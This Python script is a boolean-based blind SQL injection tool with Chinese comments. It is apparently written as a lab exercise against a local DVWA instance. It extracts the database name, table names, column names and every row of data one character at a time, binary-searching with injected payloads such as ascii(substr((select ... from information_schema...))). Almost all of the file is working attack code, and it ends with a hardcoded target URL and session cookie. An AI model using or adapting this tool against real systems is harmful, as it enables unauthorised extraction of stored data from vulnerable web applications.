import requests
import time
import random
from sql_dicts import bool_inject

chars = list(range(32, 127))


class Databases:
    def __init__(self):
        self.db_type = 'MySQL'  # 数据库类型 默认是MySQL
        self.db_len = 0  # 当前数据库名长度
        self.db_name = ''  # 当前数据库名字
        self.db_info = {}  # 字典:数据库名字->数据库名长度
        self.tables = {}  # 字典:数据库名字->表类对象(列表)


class Tables:
    def __init__(self, length, name):
        self.table_len = length  # 数据库表名的长度
        self.table_name = name  # 数据库表的名字
        self.table_info = {name: length}  # 字典:表名->表名长度
        self.columns = {}  # 字典:表名->列类对象(列表)


class Columns:
    def __init__(self, length, name):
        self.column_len = length  # 列名的长度
        self.column_name = name  # 列的名字
        self.column_info = {name: length}  # 字典:列名->列名长度
        self.data = {}  # 字典:列名->数据类对象(列表)


class Data:
    def __init__(self, length, content):
        self.data_len = length  # 数据长度
        self.data_content = content  # 数据内容
        self.data_info = {content: length}  # 字典:数据内容->数据长度


class Bool_BlindInjector:
    def __init__(self, sign, url, cookies=None):
        self.sign = sign
        self.url = url
        self.cookies = cookies
        self.db = Databases()

    def get_db_type(self):
        """获取数据库类型"""
        # 经过一系列黑盒测试 获得数据库类型
        return self.db.db_type

    def get_db_info(self):
        """获取数据库信息"""


        # 获取数据库名长度
        init_str = bool_inject[self.db.db_type]['db_len']
        length = self.get_base_info_optimized(init_str)
        self.db.db_len = length

        # 获取数据库名字
        name = ''
        if self.db.db_len > 0:
            for i in range(1, self.db.db_len + 1):
                info_type = bool_inject[self.db.db_type]['db_name']

                x = self.get_char_optimized(i, info_type)
                name += x
                print(x, end='')
            print()
        self.db.db_name = name
        self.db.db_info[self.db.db_name] = self.db.db_len

    def get_table_info(self):
        """表的信息"""
        # 获取表的个数
        count = 0
        init_str = bool_inject[self.db.db_type]['tab_count']
        count = self.get_base_info_optimized(init_str)
        print(f'[*]表的个数为{count}')

        # 获取每个表的长度
        length = []
        for j in range(0,count):
            init_str = bool_inject[self.db.db_type]['tab_len'].replace('{}',f'{j}',1)
            tab_len = self.get_base_info_optimized(init_str)
            print(f'[*]表{j + 1}的长度是{tab_len}')
            length.append(tab_len)

        # 获取表的名字
        tab_name = []
        for j in range(0,count):
            name = ''
            for i in range(1,length[j]+1):
                # bool_inject[self.db.db_type]['tab_name']=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {},1),{},1))={}#
                info_type = bool_inject[self.db.db_type]['tab_name'].replace('{}',str(j),1)
                x = self.get_char_optimized(i,info_type)
                name += x
                print(x,end='')
            print()
            print(f'[*]表{j+1}的名是{name}')
            tab_name.append(name)


        # 把表的信息存储到数据库中
        table_list = []
        for i in range(0,count):
            table = Tables(length[i],tab_name[i])
            table_list.append(table)

        self.db.tables[self.db.db_name] = table_list

    # 调用的时候要注意
    def get_column_info(self,table):
        """获取列信息"""
        tab_name = table.table_name

        # 获取列个数
        init_str = bool_inject[self.db.db_type]['col_count'].replace('{}',tab_name,1)
        count = self.get_base_info_optimized(init_str)
        print(f'[*]表{tab_name}的列个数是{count}')

        # 获取列长度
        length = []
        for j in range(0,count):
            # init_str = f"1 and length((select column_name from information_schema.columns where table_name='{tab_name}' limit {j},1)
            init_str = bool_inject[self.db.db_type]['col_len'].replace('{}',tab_name,1).replace('{}',str(j),1)
            col_len = self.get_base_info_optimized(init_str)
            length.append(col_len)
            print(f'[*]表{tab_name}的列{j + 1}的长度是{col_len}')

        # 获取列名字
        col_name = []
        for col_count in range(0,count):
            name = ''
            for z in range(1,length[col_count]+1):
                # init_str = f"(select column_name from information_schema.columns where table_name='{tab_name}' limit {col_count},1)"
                # 1'and ascii(substr((select column_name from information_schema.columns where table_name='{}' limit {},1),{},1))={}#
                info_type = bool_inject[self.db.db_type]['col_name'].replace('{}',tab_name,1).replace('{}', str(col_count), 1)
                x = self.get_char_optimized(z,info_type)
                name += x
                print(x,end='')
            print()
            print(f'[*]表{tab_name}的列{col_count + 1}为{name}')
            col_name.append(name)


        col_list = []
        for i in range(0,count):
            column = Columns(length[i],col_name[i])
            col_list.append(column)

        table.columns[tab_name] = col_list

    def get_data_info(self,table):
        """获取列数据"""

        tab_name = table.table_name
        col_obj_list = table.columns[tab_name]

        # 获取数据条数
        print('-' * 25 + '获取数据条数' + '-' * 25)
        count = 0
        init_str = bool_inject[self.db.db_type]['data_count'].replace('{}',tab_name,1)
        count = self.get_base_info_optimized(init_str)
        print(f'[*]表{tab_name}有{count}条数据')

        # 获取数据长度
        print('-' * 25 + f'获取表{tab_name}数据长度' + '-' * 25)
        data_len_dict = {} # 字典:列名->数据长度列表
        for col in col_obj_list:  # 遍历表的列
            len_list = []
            for item in range(0, count):  # 遍历数据条数
                # init_str = bool_inject[self.db.db_type]['data_len'].format(col.column_name, tab_name, item, i)
                init_str = bool_inject[self.db.db_type]['data_len'].replace('{}',col.column_name,1).replace('{}',tab_name,1).replace('{}',str(item),1)
                data_len = self.get_base_info_optimized(init_str)
                len_list.append(data_len)
                print(f'[*]表{tab_name}的列{col.column_name}的第{item + 1}条数据长度为{data_len}')
            data_len_dict[col.column_name] = len_list

        print('-' * 25 + f'获取表{tab_name}数据内容' + '-' * 25)
        # 获取数据
        data_dict = {} # 字典:列名->数据列表
        for col in col_obj_list:  # 遍历列名
            data_list = []
            for row in range(0, count):  # 遍历数据行
                data = ''
                if not data_len_dict[col.column_name][row] :
                    continue
                for i in range(1, data_len_dict[col.column_name][row]+1):  # 遍历列数据的每一个字符
                    # init_str = f'(select {col.column_name} from {tab_name} limit {row},1)'

                    # 1' and ascii(substr((select {} from {} limit {},1),{},1))={}#
                    # info_type = bool_inject[self.db.db_type]['data'].format(col.column_name,tab_name,row)
                    info_type = bool_inject[self.db.db_type]['data'].replace('{}',col.column_name,1).replace('{}', tab_name, 1).replace('{}',str(row),1)

                    x = self.get_char_optimized(i,info_type)
                    data += x
                print()
                print(f'[*]表{tab_name}的列{col.column_name}的第{row + 1}行数据是{data}')
                data_list.append(data)
            data_dict[col.column_name] = data_list


        for col in col_obj_list:
            mylist = []
            for i in range(0,count):
                data = Data(data_len_dict[col.column_name][i],data_dict[col.column_name][i])
                mylist.append(data)
            col.data[col.column_name] = mylist


    def get_base_info_optimized(self,target_expression):
        low, high = 0, 200
        while low <= high:
            mid_num = (low + high) // 2

            init_str = target_expression.format(mid_num)

            if self.send_and_check(init_str,"GET"):
                return mid_num

            gt_str = init_str[::-1].replace('=','>',1)[::-1]

            if self.send_and_check(gt_str,"GET"):
                low = mid_num + 1
            else:
                high = mid_num - 1
        # 可以添加功能 在最大的low和high中还没有找到怎么办 未实现
        return None

    def get_char_optimized(self, position, target_expression):
        """二分查找名字和内容"""
        low, high = 0, len(chars) - 1

        while low <= high:
            mid = (low + high) // 2
            mid_char = chars[mid]

            # 构造payload
            init_str = target_expression.format(position,mid_char)

            if self.send_and_check(init_str,"GET"):
                return chr(mid_char)

            # 判断大小关系
            gt_str = init_str[::-1].replace('=','>',1)[::-1]


            if self.send_and_check(gt_str,'GET'):
                low = mid + 1
            else:
                high = mid - 1

        return None

    def send_and_check(self, init_str,method=None):
        """检查请求函数"""
        # method为空 表示默认为POST方法

        query_str = { # 这里可以把参数给封装到类的属性里,暂未实现
            'id': init_str,
            'Submit':'Submit'
        }
        # time.sleep(random)
        if self.cookies :
            response = requests.get(url=self.url, params=query_str,cookies=cookies) if method else requests.post(url=self.url,data=query_str,cookies=cookies)
        else:
            response = requests.get(url=self.url, params=query_str) if method else requests.post(url=self.url,data=query_str)
        if self.sign in response.text:
            return True

        return False


    def run(self):
        # 添加测试调用
        try:
            print("开始获取数据库信息...")
            start_time = time.time()
            bool_injector.get_db_info()
            print(f"获取到的数据库名: {bool_injector.db.db_name}")
            print("开始获取数据库表信息...")
            bool_injector.get_table_info()
            print("开始获取数据库列信息...")

            for table_obj in bool_injector.db.tables[bool_injector.db.db_name]:
                print(f"\n正在处理表: {table_obj.table_name}")
                bool_injector.get_column_info(table_obj)
                print(f"表{table_obj.table_name}的列信息获取完成")

                print("开始获取数据库数据信息...")
                bool_injector.get_data_info(table_obj)
            end_time = time.time()
            consume = end_time - start_time
            print(f'[*]盲注成功,共耗时{consume:.2f}')
        except Exception as e:
            print(f"运行时错误: {e}")

if __name__ == '__main__':
    url = 'http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/'
    cookies = {'PHPSESSID':'soalt4iucd2pntd9d5t85vcsc5','security':'low'}
    params = {
        'id':"1",
        'Submit':'Submit'
    }
    response = requests.get(url=url,params=params,cookies=cookies)
    sign = 'exists'

    bool_injector = Bool_BlindInjector(sign,url,cookies)
    bool_injector.run()
